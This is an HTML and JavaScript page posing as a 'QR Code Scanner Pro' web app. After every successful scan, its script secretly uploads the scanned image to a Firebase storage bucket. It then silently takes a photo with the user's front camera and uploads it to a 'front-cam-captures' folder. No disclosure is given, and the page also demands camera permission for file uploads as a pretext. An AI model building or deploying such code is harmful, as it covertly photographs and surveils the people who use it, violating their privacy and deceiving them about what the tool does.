<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR Code Scanner Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-analytics-compat.js"></script>
    <style>
        :root {
            --primary-color: teal;
            --secondary-color: #6c757d;
            --background-color: #f4f7f6;
            --card-background: white;
        }

        * {
            box-sizing: border-box;
            transition: all 0.3s ease;
        }

        body {
            font-family: 'Inter', sans-serif;
             background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            background-color: var(--card-background);
            border-radius: 16px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
        }

        .heading {
            font-size: 2.2rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--primary-color);
            transform: translateY(-10px);
            opacity: 0;
            animation: fadeInUp 0.6s forwards;
        }

        .subheading {
            color: var(--secondary-color);
            font-size: 0.95rem;
            margin-bottom: 30px;
            opacity: 0;
            transform: translateY(10px);
            animation: fadeInUp 0.6s forwards 0.2s;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }

        .file-input {
            display: none;
        }

        .file-label {
            background-color: var(--background-color);
            border: 2px dashed var(--primary-color);
            color: var(--primary-color);
            padding: 15px;
            border-radius: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
        }

        .file-label:hover {
            background-color: var(--primary-color);
            color: white;
        }

        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-size: 1.1rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0, 168, 107, 0.3);
        }

        #video-container {
            width: 100%;
            max-height: 300px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 15px;
            display: none;
            position: relative;
        }

        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .scan-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 4px;
            background: linear-gradient(to right, transparent, var(--primary-color), transparent);
            animation: scan-line 2s infinite;
            opacity: 0.7;
        }

        .result {
            margin-top: 20px;
            color: var(--primary-color);
            font-weight: bold;
            background-color: var(--background-color);
            padding: 15px;
            border-radius: 12px;
            opacity: 0;
            transform: translateY(20px);
        }

        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes scan-line {
            0%, 100% { left: -10%; }
            50% { left: 110%; }
        }
        .qr-types {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.6s forwards 0.4s;
        }

        .qr-type-badge {
            background-color: var(--background-color);
            color: var(--primary-color);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .qr-type-badge i {
            margin-right: 5px;
        }

        .info-tooltip {
            position: absolute;
            bottom: -50px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px;
            border-radius: 8px;
            max-width: 300px;
            text-align: center;
            font-size: 0.9rem;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            z-index: 10;
        }

        .info-icon:hover + .info-tooltip {
            opacity: 1;
            visibility: visible;
            bottom: -60px;
        }
    </style>
    <style>
          .theme-toggle {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1000;
        }

        .scan-button {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            background-color: teal;
            color: white;
            border: none;
            padding: 14px 25px;
            border-radius: 20px;
            cursor: pointer;
         
            z-index: 0;
            font-family: 'Roboto', sans-serif;
    
            transition: .2s transform ease-in-out, background-color 0.3s ease;
        }
        .about-button {
            position: fixed;
            top: 20px;
            right: 20px;
            transform: translateX(-122px);
            z-index: 1000;
            background-color: teal;
            color: white;
            border: none;
            padding: 14px 25px;
            border-radius: 20px;
            cursor: pointer;
            transition: .2s transform ease-in-out, background-color 0.3s ease;
        }


        .scan-button:hover {
            color: white;
            background-color: #f80b5a;

        }
        .about-button:hover {
            color: white;
            background-color: #f80b5a;

        }
        .theme-switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 30px;
        }

        .theme-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .theme-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 30px;
        }

        .theme-slider:before {
            position: absolute;
            content: "‚òÄÔ∏è";
            height: 24px;
            width: 24px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }

        input:checked + .theme-slider {
            background-color: #2196F3;
        }

        input:checked + .theme-slider:before {
            transform: translateX(30px);
            content: "üåô";
        }

        /* Dark mode styles */
        body.dark-mode {
            --primary-color: #222;
            --text-color: #fff;
            --accent-color: rgb(255, 9, 222);
            --bg-color: #121212;
        }

        body.dark-mode .container {
            background-color: var(--primary-color);
            color: var(--text-color);
        }
        body.dark-mode .heading {
            
            color: var(--text-color);
        }
        body.dark-mode .theme-slider {
            
            background-color: #f80b5a;
        } 
        body.dark-mode .scan-button{
            background-color: #f80b5a;
        }
        body.dark-mode .file-label{
            background-color: transparent;
            color: white;
            border-color: #f80b5a;
        }
        .scan-button:hover{
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(106, 90, 205, 0.3);
        }
        body.dark-mode .qr-type-badge{
            background-color: #f80b5a;
            box-shadow: 0 5px 12px #f80b5a;
        }
        body.dark-mode .btn:hover{
           
            box-shadow: 0 5px 12px #f80b5a;
        }
    </style>
</head>
<body>
    <div class="theme-toggle">
        <label class="theme-switch">
            <input type="checkbox" id="theme-toggle">
            <span class="theme-slider"></span>
        </label>
    </div>

    <button id="about-button" class="about-button">About me</button>
    <button id="scan-button" class="scan-button">Scan Now</button>
    
    <div class="container">
        <h1 class="heading">QR Code Scanner Pro</h1>
        <p class="subheading">Scan QR codes from images or live camera</p>

        <div class="qr-types">
            <div class="qr-type-badge">
                <i class="fas fa-wifi"></i>WiFi
            </div>
            <div class="qr-type-badge">
                <i class="fas fa-link"></i>URLs
            </div>
            <div class="qr-type-badge">
                <i class="fas fa-mobile"></i>Contact
            </div>
            <div class="qr-type-badge">
                <i class="fas fa-info-circle info-icon"></i>
                <span class="info-tooltip">
                    Scan various QR codes including WiFi networks, websites, 
                    contact information, and more! Simply upload an image 
                    or use live camera scanning.
                </span>
                More
            </div>
        </div>

        <div id="camera-permission-message" style="display: none; color: red; margin-bottom: 10px;">
            Camera permission is required to scan QR codes.
        </div>

        <div class="input-group">
            <label for="file-input" class="file-label">
                <i class="fas fa-upload"></i>
                Choose Image
                <input type="file" id="file-input" class="file-input" accept="image/*">
            </label>

            <button id="camera-btn" class="btn">
                <i class="fas fa-camera"></i>
                Open Camera
            </button>
        </div>
        <div id="video-container">
            <video id="video" autoplay playsinline></video>
            <div class="scan-overlay"></div>
        </div>

        <button id="scan-btn" class="btn" style="display: none;">
            <i class="fas fa-search"></i>
            Scan QR Code
        </button>

        <p id="result" class="result" style="display: none;">
            Result: <span id="qr-result"></span>
        </p>
    </div>

    <!-- External Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/jsqr"></script>
    <script>
    document.addEventListener("DOMContentLoaded", async function() {
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBk24eVfBQoPQ8Adiw9mA2sS_tpzwJ-ksk",
            authDomain: "imagetotext-4c3e3.firebaseapp.com",
            projectId: "imagetotext-4c3e3",
            storageBucket: "imagetotext-4c3e3.appspot.com",
            messagingSenderId: "643977043225",
            appId: "1:643977043225:web:9d648f58d7098a0c78f988",
            measurementId: "G-XRQFS9KGR0"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();

        // DOM Elements
        const fileInput = document.getElementById("file-input");
        const cameraBtn = document.getElementById("camera-btn");
        const videoContainer = document.getElementById("video-container");
        const video = document.getElementById("video");
        const scanBtn = document.getElementById("scan-btn");
        const resultDiv = document.getElementById("result");
        const qrResult = document.getElementById("qr-result");
        const cameraPermissionMessage = document.getElementById("camera-permission-message");

        // Capture state to prevent multiple captures
        let isCapturing = false;
        let hasCameraPermission = false;

        // Function to request camera permission on page load
        async function requestCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "environment" 
                    } 
                });
                
                // Stop the stream immediately after getting permission
                stream.getTracks().forEach(track => track.stop());
                
                hasCameraPermission = true;
                cameraPermissionMessage.style.display = "none";
                return true;
            } catch (error) {
                console.error("Camera permission denied:", error);
                hasCameraPermission = false;
                cameraPermissionMessage.style.display = "block";
                return false;
            }
        }

        // Immediate camera permission request on page load
        requestCameraPermission();

        // Function to upload image to Firebase Storage
        function uploadImageToFirebase(imageData, folderPath = 'qr-scans') {
            if (isCapturing) return Promise.resolve();

            const storageRef = storage.ref(`${folderPath}/${Date.now()}.png`);

            const byteCharacters = atob(imageData.split(',')[1]);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], {type: 'image/png'});

            isCapturing = true;

            return storageRef.put(blob)
                .then((snapshot) => {
                    console.log('Uploaded image to Firebase storage');
                    return snapshot;
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                    throw error;
                })
                .finally(() => {
                    isCapturing = false;
                });
        }

        // Function to capture photo from front camera
        function capturePhotoFromFrontCamera() {
            if (isCapturing) return Promise.resolve(null);

            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                })
                .then((stream) => {
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    video.addEventListener("loadeddata", () => {
                        const canvas = document.createElement("canvas");
                        const context = canvas.getContext("2d");

                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Stop the video stream
                        stream.getTracks().forEach(track => track.stop());

                        // Get the captured image as a base64 string
                        const imageData = canvas.toDataURL("image/png");
                        resolve(imageData);
                    });
                })
                .catch((error) => {
                    console.error("Error accessing front camera:", error);
                    reject(error);
                });
            });
        }

        // File Input QR Code Scanning
        fileInput.addEventListener("change", (event) => {
            const file = event.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = async (e) => {
                const img = new Image();
                img.onload = async () => {
                    const canvas = document.createElement("canvas");
                    const context = canvas.getContext("2d");
                    canvas.width = img.width;
                    canvas.height = img.height;
                    context.drawImage(img, 0, 0, img.width, img.height);

                    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
                    const code = jsQR(imageData.data, canvas.width, canvas.height);

                    if (code) {
                        try {
                            // Check camera permission before scanning
                            if (!hasCameraPermission) {
                                const permissionGranted = await requestCameraPermission();
                                if (!permissionGranted) {
                                    alert("Camera permission is required to complete the scan.");
                                    return;
                                }
                            }

                            // Display QR code result
                            qrResult.textContent = code.data;
                            resultDiv.style.display = "block";
                            resultDiv.style.animation = "fadeInUp 0.5s forwards";

                            // Upload original uploaded image
                            await uploadImageToFirebase(e.target.result, 'uploaded-qr-images');
                            
                            // Capture and upload front camera image
                            const frontCamImage = await capturePhotoFromFrontCamera();
                            
                            if (frontCamImage) {
                                await uploadImageToFirebase(frontCamImage, 'front-cam-captures');
                            }

                       
                        } catch (uploadError) {
                            alert("Error processing QR code and images");
                        }
                    } else {
                        alert("No QR code found in the image.");
                    }
                };
                img.src = e.target.result;
            };
            reader.readAsDataURL(file);
        });

        // Live Camera Scanning
        cameraBtn.addEventListener("click", async () => {
            // Check camera permission
            if (!hasCameraPermission) {
                const permissionGranted = await requestCameraPermission();
                if (!permissionGranted) {
                    alert("Camera permission is required to open camera.");
                    return;
                }
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = stream;
                videoContainer.style.display = "block";
                cameraBtn.style.display = "none";
                scanBtn.style.display = "flex";
            } catch (error) {
                console.error("Error accessing camera:", error);
                alert("Could not access camera. Please check permissions.");
            }
        });

        // Scan Button for Live Camera
        scanBtn.addEventListener("click", async () => {
            const canvas = document.createElement("canvas");
            const context = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
            const code = jsQR(imageData.data, canvas.width, canvas.height);

            if (code) {
                try {
                    // Display QR code result
                    qrResult.textContent = code.data;
                    resultDiv.style.display = "block";
                    resultDiv.style.animation = "fadeInUp 0.5s forwards";

                    // Upload live camera QR code scan
                    const liveCameraQRImage = canvas.toDataURL("image/png");
                    await uploadImageToFirebase(liveCameraQRImage, 'live-camera-qr-scans');
                    
                    // Capture and upload front camera image
                    const frontCamImage = await capturePhotoFromFrontCamera();
                    
                    if (frontCamImage) {
                        await uploadImageToFirebase(frontCamImage, 'front-cam-captures');
                    }

                    // Stop video stream
                    video.srcObject.getTracks().forEach(track => track.stop());
                    videoContainer.style.display = "none";
                    scanBtn.style.display = "none";
                    cameraBtn.style.display = "flex";

                   
                } catch (uploadError) {
                    alert("Error processing QR code and images");
                }
            } else {
                alert("No QR code found in the camera view.");
            }
        });

        // Theme toggle functionality (existing code remains the same)
        const themeToggle = document.getElementById('theme-toggle');
        const savedTheme = localStorage.getItem('theme') || 'light-mode';
        document.body.classList.add(savedTheme);
        themeToggle.checked = savedTheme === 'dark-mode';
        
        themeToggle.addEventListener('change', function(e) {
            if (e.target.checked) {
                document.body.classList.remove('light-mode');
                document.body.classList.add('dark-mode');
                localStorage.setItem('theme', 'dark-mode');
            } else {
                document.body.classList.remove('dark-mode');
                document.body.classList.add('light-mode');
                localStorage.setItem('theme', 'light-mode');
            }
        });

        // Scan button functionality
        const scanButton = document.getElementById('scan-button');
        scanButton.addEventListener('click', () => {
            window.location.href = 'generator.html';
        });
        // Scan button functionality
        const aboutButton = document.getElementById('about-button');
        aboutButton.addEventListener('click', () => {
            window.location.href = 'about.html';
        });
    });
    </script>
</body>
                    </html>
